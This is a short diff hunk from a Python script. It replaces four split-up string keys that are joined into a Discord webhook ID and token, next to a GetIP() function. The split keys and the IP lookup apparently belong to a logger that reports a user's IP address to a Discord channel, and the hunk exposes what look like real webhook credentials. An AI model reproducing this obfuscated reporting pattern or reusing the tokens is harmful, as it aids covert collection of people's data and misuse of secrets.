@@ -10,10 +10,10 @@ def GetIP():
         pass
     return ip.replace("\"", "")
 
-key1 = '931710180'
-key2 = '104740885'
-key3 = 'cVX9D5mhe62PGxUtocAQmk6jju5M'
-key4 = 'f0Yy5UyHYlYrWGpVE3d2UW-M-wv4gODup8EnRgkc'
+key1 = '931787694'
+key2 = '592376833'
+key3 = 'MjSLoMR4EBXvh-k1XCTAWuHcbRfOz9ezQaGvQruIsBC'
+key4 = 't_Y_c8JLSO0a9r_ptptPND7pS'
 
 webhook = discord.Webhook.partial(key1 + key2, key3 + key4, adapter=discord.RequestsWebhookAdapter())
 
